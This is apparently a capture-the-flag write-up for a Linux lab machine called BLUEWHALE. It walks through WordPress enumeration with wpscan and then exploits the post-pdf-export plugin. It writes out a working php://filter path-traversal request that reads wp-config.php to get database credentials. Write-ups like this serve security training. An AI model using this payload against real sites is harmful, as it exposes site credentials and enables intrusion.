## BLUEWHALE

DIFFICULTY= medium

OS = Linux


### Nmap scan

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e7ac9040-3910-472c-be9b-5ef758724426)

adding the domain to /etc/hosts
``echo "ip  bluewhale.net" >> /etc/hosts``

so, visiting the site shows it's running wordpress

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/016ff2dd-3aa3-4996-87f1-71fe567ed16f)

let's enumerate the wordpress using ``wpscan`` aggressive detection

```wpscan --url http://bluewhale.net/  --plugins-detection aggressive -t 120```

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e4f489b7-a427-4c19-8ae1-ac24d5acb083)

it gives us a vulnerable plugin; the plugin is vulnerable to arbitrary file read

so, we can exploit it using [this](https://www.exploit-db.com/exploits/33004)

doing that,we should be able to read the wordpress config file ``wp-config``

```bluewhale.net/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php```

reading it gives us the gives us the base64 encoded file.

decoding it shows the database credentials

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/01cdc783-aa0d-4bb4-90b5-4cc1923258e5)




